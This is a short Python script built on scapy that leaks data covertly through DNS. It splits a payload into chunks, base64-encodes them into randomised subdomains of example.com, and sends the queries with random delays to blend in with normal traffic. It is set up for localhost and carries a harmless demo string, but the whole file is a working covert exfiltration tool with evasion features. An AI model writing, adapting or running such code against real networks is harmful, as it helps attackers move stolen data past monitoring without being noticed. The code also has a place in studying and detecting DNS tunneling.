import os
import random
import string
import time
import base64
from scapy.all import *

# Configuration
DOMAIN = "example.com"  # Domain for DNS queries
dns_servers = ["127.0.0.1"]  # Set to localhost for local testing

# Send Covert Payload Using DNS
def send_covert_payload(payload, domain=DOMAIN):
    """
    Sends a covert payload using DNS queries to hide the transmission.
    Args:
        payload (str): The secret message to send covertly.
        domain (str): The domain for DNS query-based transmission.
    """
    # Split payload into small chunks to be hidden in DNS requests
    chunk_size = 10  # Smaller chunks for better blending in
    payload_chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
    
    for chunk in payload_chunks:
        # Encode the chunk to make it look less suspicious
        encoded_chunk = base64.urlsafe_b64encode(chunk.encode()).decode().rstrip('=')
        
        # Add a random prefix for a more natural-looking subdomain
        random_label = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
        query_domain = f"{random_label}-{encoded_chunk}.{domain}"
        
        # Construct the DNS packet
        packet = IP(dst=random.choice(dns_servers)) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=query_domain))
        
        # Send the packet
        send(packet, verbose=False)
        time.sleep(random.uniform(0.5, 2.0))  # Random delay for more natural traffic

# Entry point for the script
if __name__ == "__main__":
    # Example payload to send covertly
    secret_payload = "This is a secret payload."

    # Send the covert payload
    send_covert_payload(secret_payload)

    print("Payload transmitted.")